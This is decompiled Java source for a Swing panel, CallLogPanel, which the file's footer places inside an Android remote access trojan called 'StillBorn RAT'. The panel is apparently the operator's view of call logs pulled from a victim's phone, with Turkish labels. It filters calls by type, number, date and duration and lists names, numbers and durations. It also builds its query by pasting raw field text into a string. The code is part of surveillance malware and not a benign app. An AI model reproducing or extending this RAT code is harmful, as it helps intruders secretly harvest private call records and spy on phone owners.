/*   1:    */ package gui.panel;
/*   2:    */ 
/*   3:    */ import Packet.CallPacket;
/*   4:    */ import gui.UserGUI;
/*   5:    */ import java.awt.Color;
/*   6:    */ import java.awt.event.ActionEvent;
/*   7:    */ import java.awt.event.ActionListener;
/*   8:    */ import java.io.PrintStream;
/*   9:    */ import java.text.DateFormat;
/*  10:    */ import java.text.ParseException;
/*  11:    */ import java.text.SimpleDateFormat;
/*  12:    */ import java.util.ArrayList;
/*  13:    */ import java.util.Date;
/*  14:    */ import javax.swing.DefaultComboBoxModel;
/*  15:    */ import javax.swing.GroupLayout;
/*  16:    */ import javax.swing.GroupLayout.Alignment;
/*  17:    */ import javax.swing.GroupLayout.ParallelGroup;
/*  18:    */ import javax.swing.GroupLayout.SequentialGroup;
/*  19:    */ import javax.swing.JButton;
/*  20:    */ import javax.swing.JComboBox;
/*  21:    */ import javax.swing.JFormattedTextField;
/*  22:    */ import javax.swing.JLabel;
/*  23:    */ import javax.swing.JPanel;
/*  24:    */ import javax.swing.JScrollPane;
/*  25:    */ import javax.swing.JSplitPane;
/*  26:    */ import javax.swing.JTextField;
/*  27:    */ import javax.swing.LayoutStyle.ComponentPlacement;
/*  28:    */ import javax.swing.UIManager;
/*  29:    */ import javax.swing.border.TitledBorder;
/*  30:    */ import javax.swing.text.MaskFormatter;
/*  31:    */ 
/*  32:    */ public class CallLogPanel
/*  33:    */   extends JPanel
/*  34:    */ {
/*  35: 51 */   public static Color IN_CALL = new Color(14, 92, 7);
/*  36: 52 */   public static Color MISSED_IN_CALL = Color.red;
/*  37: 53 */   public static Color OUT_CALL = Color.blue;
/*  38:    */   private JFormattedTextField formattedMinDate;
/*  39:    */   private JFormattedTextField formattedMaxDate;
/*  40:    */   private JComboBox comboBox;
/*  41:    */   private ColorPane colorPane;
/*  42:    */   private JTextField phoneNumberField;
/*  43:    */   private JTextField minDurationField;
/*  44:    */   private JTextField maxDurationField;
/*  45:    */   private UserGUI gui;
/*  46:    */   
/*  47:    */   public CallLogPanel(UserGUI gui)
/*  48:    */   {
/*  49: 69 */     this.gui = gui;
/*  50:    */     
/*  51: 71 */     JLabel lblTypes = new JLabel("Türler :");
/*  52:    */     
/*  53: 73 */     JLabel lblIncomingCall = new JLabel("gelen çağrı");
/*  54: 74 */     lblIncomingCall.setForeground(IN_CALL);
/*  55:    */     
/*  56: 76 */     JLabel lblOutgoingCall = new JLabel("giden çağrı");
/*  57: 77 */     lblOutgoingCall.setForeground(OUT_CALL);
/*  58:    */     
/*  59: 79 */     JLabel lblMissedIncomingCall = new JLabel("cevapsız çağrı");
/*  60: 80 */     lblMissedIncomingCall.setForeground(MISSED_IN_CALL);
/*  61:    */     
/*  62: 82 */     JSplitPane splitPane = new JSplitPane();
/*  63: 83 */     splitPane.setResizeWeight(1.0D);
/*  64: 84 */     GroupLayout groupLayout = new GroupLayout(this);
/*  65: 85 */     groupLayout.setHorizontalGroup(
/*  66: 86 */       groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  67: 87 */       .addGroup(groupLayout.createSequentialGroup()
/*  68: 88 */       .addContainerGap()
/*  69: 89 */       .addGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  70: 90 */       .addGroup(groupLayout.createSequentialGroup()
/*  71: 91 */       .addComponent(splitPane, -1, 512, 32767)
/*  72: 92 */       .addContainerGap())
/*  73: 93 */       .addGroup(groupLayout.createSequentialGroup()
/*  74: 94 */       .addComponent(lblTypes)
/*  75: 95 */       .addGap(29)
/*  76: 96 */       .addComponent(lblIncomingCall)
/*  77: 97 */       .addGap(42)
/*  78: 98 */       .addComponent(lblMissedIncomingCall)
/*  79: 99 */       .addGap(37)
/*  80:100 */       .addComponent(lblOutgoingCall)
/*  81:101 */       .addGap(209)))));
/*  82:    */     
/*  83:103 */     groupLayout.setVerticalGroup(
/*  84:104 */       groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  85:105 */       .addGroup(groupLayout.createSequentialGroup()
/*  86:106 */       .addContainerGap()
/*  87:107 */       .addGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.BASELINE)
/*  88:108 */       .addComponent(lblTypes)
/*  89:109 */       .addComponent(lblIncomingCall)
/*  90:110 */       .addComponent(lblMissedIncomingCall)
/*  91:111 */       .addComponent(lblOutgoingCall))
/*  92:112 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/*  93:113 */       .addComponent(splitPane, -1, 358, 32767)
/*  94:114 */       .addContainerGap()));
/*  95:    */     
/*  96:    */ 
/*  97:117 */     JScrollPane scrollPane = new JScrollPane();
/*  98:118 */     splitPane.setLeftComponent(scrollPane);
/*  99:    */     
/* 100:120 */     this.colorPane = new ColorPane();
/* 101:121 */     scrollPane.setViewportView(this.colorPane);
/* 102:    */     
/* 103:123 */     JPanel panel = new JPanel();
/* 104:124 */     splitPane.setRightComponent(panel);
/* 105:125 */     panel.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Opsiyonel filtreler", 4, 2, null, null));
/* 106:    */     
/* 107:127 */     JLabel lblTypeOfCall = new JLabel("Çağrı türü :");
/* 108:    */     
/* 109:129 */     this.comboBox = new JComboBox();
/* 110:130 */     this.comboBox.setModel(new DefaultComboBoxModel(new String[] { "Tüm çağrılar", "Gelen çağrılar", "Giden çağrılar", "cevapsız çağrılar" }));
/* 111:    */     
/* 112:132 */     JLabel lblPhoneNumber = new JLabel("Tel. No. :");
/* 113:    */     
/* 114:134 */     this.phoneNumberField = new JTextField();
/* 115:135 */     this.phoneNumberField.setColumns(10);
/* 116:    */     
/* 117:137 */     JLabel lblMinDate = new JLabel("(dd/mm/yyyy) tarihten öncekiler hariç :");
/* 118:    */     
/* 119:139 */     this.formattedMinDate = new JFormattedTextField(createFormatter("**/**/****"));
/* 120:    */     
/* 121:141 */     JLabel lblNotAfter = new JLabel("Sonrakiler hariç");
/* 122:    */     
/* 123:143 */     this.formattedMaxDate = new JFormattedTextField(createFormatter("**/**/****"));
/* 124:    */     
/* 125:145 */     JLabel lblDuration = new JLabel("Minimum süre :");
/* 126:    */     
/* 127:147 */     JLabel lblD = new JLabel("d >");
/* 128:    */     
/* 129:149 */     this.minDurationField = new JTextField();
/* 130:150 */     this.minDurationField.setColumns(10);
/* 131:    */     
/* 132:152 */     JLabel lblD_1 = new JLabel("d <");
/* 133:    */     
/* 134:154 */     this.maxDurationField = new JTextField();
/* 135:155 */     this.maxDurationField.setColumns(10);
/* 136:    */     
/* 137:157 */     JButton btnGetCallLogs = new JButton("Arama kaydı bul");
/* 138:158 */     btnGetCallLogs.addActionListener(new ActionListener()
/* 139:    */     {
/* 140:    */       public void actionPerformed(ActionEvent e)
/* 141:    */       {
/* 142:160 */         CallLogPanel.this.fireGetCallLogs();
/* 143:    */       }
/* 144:162 */     });
/* 145:163 */     GroupLayout gl_panel = new GroupLayout(panel);
/* 146:164 */     gl_panel.setHorizontalGroup(
/* 147:165 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 148:166 */       .addGroup(gl_panel.createSequentialGroup()
/* 149:167 */       .addContainerGap()
/* 150:168 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 151:169 */       .addComponent(btnGetCallLogs, -1, 125, 32767)
/* 152:170 */       .addComponent(this.comboBox, 0, 125, 32767)
/* 153:171 */       .addComponent(lblTypeOfCall)
/* 154:172 */       .addComponent(lblPhoneNumber)
/* 155:173 */       .addComponent(this.phoneNumberField, -1, 125, 32767)
/* 156:174 */       .addComponent(lblMinDate)
/* 157:175 */       .addComponent(this.formattedMinDate, -1, 125, 32767)
/* 158:176 */       .addComponent(lblNotAfter)
/* 159:177 */       .addComponent(this.formattedMaxDate, -1, 125, 32767)
/* 160:178 */       .addComponent(lblDuration)
/* 161:179 */       .addGroup(gl_panel.createSequentialGroup()
/* 162:180 */       .addComponent(lblD)
/* 163:181 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 164:182 */       .addComponent(this.minDurationField, -1, 104, 32767))
/* 165:183 */       .addGroup(gl_panel.createSequentialGroup()
/* 166:184 */       .addComponent(lblD_1)
/* 167:185 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 168:186 */       .addComponent(this.maxDurationField, -1, 104, 32767)))
/* 169:187 */       .addContainerGap()));
/* 170:    */     
/* 171:189 */     gl_panel.setVerticalGroup(
/* 172:190 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 173:191 */       .addGroup(gl_panel.createSequentialGroup()
/* 174:192 */       .addContainerGap()
/* 175:193 */       .addComponent(lblTypeOfCall)
/* 176:194 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 177:195 */       .addComponent(this.comboBox, -2, -1, -2)
/* 178:196 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 179:197 */       .addComponent(lblPhoneNumber)
/* 180:198 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 181:199 */       .addComponent(this.phoneNumberField, -2, -1, -2)
/* 182:200 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 183:201 */       .addComponent(lblMinDate)
/* 184:202 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 185:203 */       .addComponent(this.formattedMinDate, -2, -1, -2)
/* 186:204 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 187:205 */       .addComponent(lblNotAfter)
/* 188:206 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 189:207 */       .addComponent(this.formattedMaxDate, -2, -1, -2)
/* 190:208 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 191:209 */       .addComponent(lblDuration)
/* 192:210 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 193:211 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 194:212 */       .addComponent(lblD)
/* 195:213 */       .addComponent(this.minDurationField, -2, -1, -2))
/* 196:214 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 197:215 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 198:216 */       .addComponent(lblD_1)
/* 199:217 */       .addComponent(this.maxDurationField, -2, -1, -2))
/* 200:218 */       .addGap(18)
/* 201:219 */       .addComponent(btnGetCallLogs)
/* 202:220 */       .addContainerGap(-1, 32767)));
/* 203:    */     
/* 204:222 */     panel.setLayout(gl_panel);
/* 205:223 */     setLayout(groupLayout);
/* 206:    */   }
/* 207:    */   
/* 208:    */   protected MaskFormatter createFormatter(String s)
/* 209:    */   {
/* 210:228 */     MaskFormatter formatter = null;
/* 211:    */     try
/* 212:    */     {
/* 213:230 */       formatter = new MaskFormatter(s);
/* 214:    */     }
/* 215:    */     catch (ParseException localParseException) {}
/* 216:233 */     return formatter;
/* 217:    */   }
/* 218:    */   
/* 219:    */   private void fireGetCallLogs()
/* 220:    */   {
/* 221:237 */     String request = "";
/* 222:238 */     if (this.comboBox.getSelectedIndex() != 0) {
/* 223:238 */       request = request + " type = " + this.comboBox.getSelectedIndex();
/* 224:    */     }
/* 225:239 */     if (!this.phoneNumberField.getText().equalsIgnoreCase("")) {
/* 226:240 */       if (request.equals("")) {
/* 227:240 */         request = request + " number = '" + this.phoneNumberField.getText() + "'";
/* 228:    */       } else {
/* 229:241 */         request = request + " and number = '" + this.phoneNumberField.getText() + "'";
/* 230:    */       }
/* 231:    */     }
/* 232:244 */     if ((this.formattedMinDate.getValue() != null) && 
/* 233:245 */       (!this.formattedMinDate.getValue().equals("  /  /    ")))
/* 234:    */     {
/* 235:246 */       System.out.println("Valeur min. tarihi : " + this.formattedMinDate.getValue());
/* 236:247 */       String[] res = ((String)this.formattedMinDate.getValue()).split("/");
/* 237:    */       
/* 238:    */ 
/* 239:250 */       DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");
/* 240:    */       try
/* 241:    */       {
/* 242:253 */         Date date = formatter.parse(this.formattedMinDate.getText());
/* 243:254 */         if (request.equals("")) {
/* 244:254 */           request = request + " date > " + date.getTime();
/* 245:    */         } else {
/* 246:255 */           request = request + " and date > " + date.getTime();
/* 247:    */         }
/* 248:    */       }
/* 249:    */       catch (ParseException e)
/* 250:    */       {
/* 251:257 */         this.gui.errLogTxt(new Date().getTime(), "Yanlış tarih formatı");
/* 252:    */       }
/* 253:    */     }
/* 254:262 */     if ((this.formattedMaxDate.getValue() != null) && 
/* 255:263 */       (!this.formattedMaxDate.getValue().equals("  /  /    ")))
/* 256:    */     {
/* 257:264 */       System.out.println("Valeur min. tarihi : " + this.formattedMaxDate.getValue());
/* 258:265 */       String[] res = ((String)this.formattedMaxDate.getValue()).split("/");
/* 259:    */       
/* 260:    */ 
/* 261:268 */       DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");
/* 262:    */       try
/* 263:    */       {
/* 264:271 */         Date date = formatter.parse(this.formattedMaxDate.getText());
/* 265:272 */         if (request.equals("")) {
/* 266:272 */           request = request + " date < " + date.getTime();
/* 267:    */         } else {
/* 268:273 */           request = request + " and date < " + date.getTime();
/* 269:    */         }
/* 270:    */       }
/* 271:    */       catch (ParseException e)
/* 272:    */       {
/* 273:275 */         this.gui.errLogTxt(new Date().getTime(), "Yanlış tarih formatı");
/* 274:    */       }
/* 275:    */     }
/* 276:281 */     if (!this.minDurationField.getText().equalsIgnoreCase("")) {
/* 277:282 */       if (request.equals("")) {
/* 278:282 */         request = request + " duration > " + this.minDurationField.getText();
/* 279:    */       } else {
/* 280:283 */         request = request + " and duration > " + this.minDurationField.getText();
/* 281:    */       }
/* 282:    */     }
/* 283:285 */     if (!this.maxDurationField.getText().equalsIgnoreCase("")) {
/* 284:286 */       if (request.equals("")) {
/* 285:286 */         request = request + " duration < " + this.maxDurationField.getText();
/* 286:    */       } else {
/* 287:287 */         request = request + " and duration < " + this.maxDurationField.getText();
/* 288:    */       }
/* 289:    */     }
/* 290:290 */     this.gui.fireGetCallLogs(request);
/* 291:    */   }
/* 292:    */   
/* 293:    */   public void updateCallLogs(ArrayList<CallPacket> logsList)
/* 294:    */   {
/* 295:294 */     clearPanel();
/* 296:295 */     for (CallPacket packet : logsList)
/* 297:    */     {
/* 298:296 */       String name = packet.getName();
/* 299:297 */       if (name == null) {
/* 300:298 */         name = "/";
/* 301:    */       }
/* 302:299 */       int type = packet.getType();
/* 303:300 */       String messtype = "";
/* 304:301 */       if (type == 1) {
/* 305:301 */         messtype = "Gelen çağrı";
/* 306:302 */       } else if (type == 2) {
/* 307:302 */         messtype = "Giden çağrı";
/* 308:303 */       } else if (type == 3) {
/* 309:303 */         messtype = "Cevapsız çağrı";
/* 310:    */       }
/* 311:304 */       String line = String.valueOf(packet.getId());
/* 312:305 */       line = line + ". " + messtype + ": " + packet.getPhoneNumber();
/* 313:306 */       line = line + "\n\tİsim: " + name;
/* 314:307 */       line = line + "\n\tSüre: " + packet.getDuration() + "s\n\t";
/* 315:308 */       line = line + "Tarih: " + new Date(packet.getDate()).toString();
/* 316:309 */       line = line + "\n\n";
/* 317:311 */       if (packet.getType() == 1) {
/* 318:311 */         this.colorPane.append(IN_CALL, line);
/* 319:312 */       } else if (packet.getType() == 2) {
/* 320:312 */         this.colorPane.append(OUT_CALL, line);
/* 321:    */       } else {
/* 322:313 */         this.colorPane.append(MISSED_IN_CALL, line);
/* 323:    */       }
/* 324:    */     }
/* 325:    */   }
/* 326:    */   
/* 327:    */   public void addCall(String txt, Color color)
/* 328:    */   {
/* 329:318 */     this.colorPane.append(color, txt);
/* 330:    */   }
/* 331:    */   
/* 332:    */   public void clearPanel()
/* 333:    */   {
/* 334:322 */     this.colorPane.setText("");
/* 335:    */   }
/* 336:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     gui.panel.CallLogPanel
 * JD-Core Version:    0.7.0.1
 */